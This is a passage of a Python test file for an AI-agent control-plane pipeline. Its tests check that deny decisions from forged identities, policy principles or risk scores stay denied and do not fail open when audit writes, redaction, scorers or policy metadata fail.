    escape to _fail_safe and turn a forged-identity DENY into a fail-open ALLOW."""
    from agentos_controlplane.audit import RedactionError

    class PayloadRedactionFailingAudit:
        """Raises RedactionError while the appended action carries a payload;
        succeeds on the payload-free retry."""

        def __init__(self) -> None:
            self.calls: list[AgentAction] = []
            self._id = uuid4()

        async def append(self, action: AgentAction, decision) -> UUID:
            self.calls.append(action)
            if action.payload:
                raise RedactionError("unclassifiable payload field: 'rogue'")
            return self._id

    audit = PayloadRedactionFailingAudit()
    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=False, detail="forged"),
        policy=SpyPolicyEngine(Outcome.allow),
        scorers=[],
        audit=audit,
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m", "rogue": "x"}, identity_token="forged",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny  # the short-circuit deny STANDS
    assert any(r.code == "forged_or_unknown_identity" for r in decision.reasons)
    assert any(r.code == "redaction_failed" for r in decision.reasons)
    assert audit.calls[-1].payload == {}  # the retry is payload-free
    assert decision.evidence_ref is not None


def test_unknown_fired_principle_ref_never_relaxes_computed_deny() -> None:
    """C1 repro 2: a fired ref missing from principles_meta must not crash reason
    construction AFTER the deny floor into a fail-open ALLOW — the deny survives."""

    class UnknownRefPolicyEngine:
        constitution_version = "sha256:stub-constitution"
        policy_version = "sha256:stub-policy"
        principles_meta: dict = {}  # lacks the fired ref "9.9"

        def evaluate(self, input: dict) -> ConstitutionResult:
            return ConstitutionResult(
                matched=(MatchedPrinciple(principle_ref="9.9", effect="deny"),),
                no_match=False,
            )

    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=UnknownRefPolicyEngine(),
        scorers=[],
        audit=FakeAuditWriter(),
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny
    fired = [r for r in decision.reasons if r.code == "constitution_principle_fired"]
    assert fired and fired[0].principle_ref == "9.9"  # the matched deny survives


def test_string_principles_meta_value_never_relaxes_computed_deny() -> None:
    """Re-review hardening: a principles_meta VALUE that is a string (not a dict)
    must not crash reason construction BEFORE the deny floor is captured — the
    floor is recorded the moment it is computed, so the deny can never relax
    into a fail-open ALLOW."""

    class StringMetaPolicyEngine:
        constitution_version = "sha256:stub-constitution"
        policy_version = "sha256:stub-policy"
        principles_meta: dict = {"9.9": "not-a-dict"}  # malformed meta VALUE

        def evaluate(self, input: dict) -> ConstitutionResult:
            return ConstitutionResult(
                matched=(MatchedPrinciple(principle_ref="9.9", effect="deny"),),
                no_match=False,
            )

    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=StringMetaPolicyEngine(),
        scorers=[],
        audit=FakeAuditWriter(),
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny  # the matched deny survives bad meta


def test_audit_failure_after_risk_driven_deny_never_relaxes_to_fail_open_allow() -> None:
    """Re-review hardening: a risk-driven deny (floor allow, risk >= deny_at) on a
    fail-open class must survive a NON-RedactionError audit failure — the fail-safe
    inherits the FINAL graduated outcome, not just the policy floor. The writer
    fails only the hot-path append and accepts the fail-safe's payload-free record,
    so the relaxation would be an audited ALLOW (not caught by no-record->no-allow)."""

    class FirstAppendFailingAudit:
        def __init__(self) -> None:
            self.calls = 0
            self._id = uuid4()

        async def append(self, action: AgentAction, decision) -> UUID:
            self.calls += 1
            if self.calls == 1:
                raise RuntimeError("audit store down")  # NOT a RedactionError
            return self._id

    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=SpyPolicyEngine(Outcome.allow),  # benign: no_match -> floor allow
        scorers=[SpyScorer(0.9)],               # risk >= deny_at -> graduated deny
        audit=FirstAppendFailingAudit(),
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny  # the computed verdict never relaxes


def test_post_floor_failure_inherits_computed_deny_floor_on_fail_open_class() -> None:
    """C1 belt-and-braces: ANY exception after the deny floor was computed must
    inherit that floor in _fail_safe — a fail-open allow can never override it."""

    class RaisingScorer:
        name = "raising.v1"
        inline = True

        def score(self, action: AgentAction) -> RiskFinding:
            raise RuntimeError("scorer down")

    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=SpyPolicyEngine(Outcome.deny),
        scorers=[RaisingScorer()],
        audit=FakeAuditWriter(),
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny  # the computed floor wins over fail-open


def test_redaction_failure_writes_payload_free_record_and_applies_posture() -> None:
    from agentos_controlplane.audit import RedactionError

    class RedactionFailingAudit:
        """Raises RedactionError on the FIRST append, succeeds on the retry."""

        def __init__(self) -> None:
            self.calls: list[AgentAction] = []
            self._id = uuid4()

        async def append(self, action: AgentAction, decision) -> UUID:
            self.calls.append(action)
            if len(self.calls) == 1:
                raise RedactionError("unclassifiable payload field: 'rogue'")
            return self._id

    audit = RedactionFailingAudit()
    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=SpyPolicyEngine(Outcome.allow),
        scorers=[],
        audit=audit,
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny  # closed posture applies BEFORE the retry
    assert any(r.code == "redaction_failed" for r in decision.reasons)
    assert len(audit.calls) == 2
    assert audit.calls[1].payload == {}  # the retry is payload-free
    assert decision.evidence_ref is not None
